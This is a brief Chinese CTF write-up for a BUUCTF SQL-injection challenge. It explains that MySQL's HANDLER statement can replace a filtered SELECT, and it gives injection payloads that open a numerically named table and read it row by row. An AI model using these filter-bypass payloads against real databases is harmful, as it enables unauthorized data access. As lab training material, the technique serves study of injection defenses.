### handler 代替 select

话不多说，直接上题（BUUCTF）

![](https://pic1.imgdb.cn/item/682afb5c58cb8da5c8fc3326.jpg)

如果 handler 没有被过滤，可以使用代替 select

但它只能一行一行读取数据

首先使用 `handler table_name open` 打开这个数字表

```sql
handler `1919810931114514` open as a;
```

打开成功后才能开始读取数据

```sql
handler `a` read next;#
```
